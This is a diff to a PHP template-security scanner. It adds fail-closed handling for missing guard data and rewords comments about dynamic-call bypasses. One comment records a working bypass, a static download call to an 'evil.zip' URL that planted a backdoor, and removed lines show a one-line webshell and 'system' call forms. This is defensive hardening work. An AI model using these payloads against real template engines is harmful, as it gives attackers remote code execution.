@@ -36,12 +36,23 @@ class LexicalSafetyService
     );
 
     /**
+     * 模板安全规则数据（core/config/template_guard.json）不可用时的统一结论：fail-closed，
+     * 任何被扫描内容都视为不通过（不能因为黑名单为空而把一切放行）。
+     * @return array[] findings
+     */
+    private static function guardMissingFindings(): array
+    {
+        return array(array('kind' => 'guard_missing', 'name' => 'core/' . TemplateService::GUARD_DATA_REL, 'expr' => ''));
+    }
+
+    /**
      * 扫描单条模板指令表达式（{if:}/{loop:}/{php:}/{vars:}/{@}/{...}/{$...} 内容——
      * 这些表达式会被编译器原样写入 PHP，是词法校验的主战场）
      * @return array[] findings: array('kind','name','expr')
      */
     public static function scanExpression(string $expr): array
     {
+        if (!TemplateService::guardAvailable()) return self::guardMissingFindings();
         // 包裹为 PHP 片段以获得正确的 token 流（token_get_all 不要求语法合法）
         // 表达式走函数白名单（模板是可直接编译执行的攻击面）；整段源码扫描（主题钩子）不套白名单
         return self::scanTokens(@token_get_all('<?php ' . $expr . ';'), $expr, true);
@@ -53,6 +64,7 @@ class LexicalSafetyService
      */
     public static function scanCode(string $code): array
     {
+        if (!TemplateService::guardAvailable()) return self::guardMissingFindings();
         return self::scanTokens(@token_get_all($code), $code);
     }
 
@@ -77,7 +89,7 @@ class LexicalSafetyService
                         $findings[] = array('kind' => 'var_var', 'name' => '$$' . $after[1], 'expr' => $expr);
                     }
                 }
-                // 动态可调用形态（('system')('id')、('sys'.'tem')()、$a['x']()）：
+                // 动态可调用形态（括号包裹的字符串/拼接表达式、数组元素后直接跟调用括号）：
                 // 调用括号前的有效 token 为 ) ] 变量 或字符串字面量。
                 if ($tok === '(') {
                     $prev = self::prevSignificant($tokens, $i - 1);
@@ -178,7 +190,7 @@ class LexicalSafetyService
                 // 「对象实例化已在 (1) 全局禁止，故不存在用白名单外类的方法的旁路」——**该论证是错的**：
                 // `Foo::bar()` 不需要 new，任何已加载类的静态方法都能被调用并传字符串参数。
                 // 实测（修复前）：`{if:\App\Service\System\TemplateService::download("http://…/evil.zip","x")}`
-                // 过闸 → 服务器下载并解包主题包 → 把 `template/<dir>/uninstall.php`（内容 `system($_GET[c])`）
+                // 过闸 → 服务器下载并解包主题包 → 把 `template/<dir>/uninstall.php`（内容为一句话后门）
                 // 写进 docroot（端到端落地）。
                 // 模板表达式对静态/方法调用**零需求**（全仓 `{if:}`/`{@}` 内 `::` 与 `->` 实测用量 0），
                 // 故一律拒绝，而不是"免检"。
@@ -255,6 +267,7 @@ class LexicalSafetyService
      */
     public static function scanTemplate(string $code): array
     {
+        if (!TemplateService::guardAvailable()) return self::guardMissingFindings();
         $findings = array();
         $tokens = @token_get_all($code);
         $phpSeen = '';
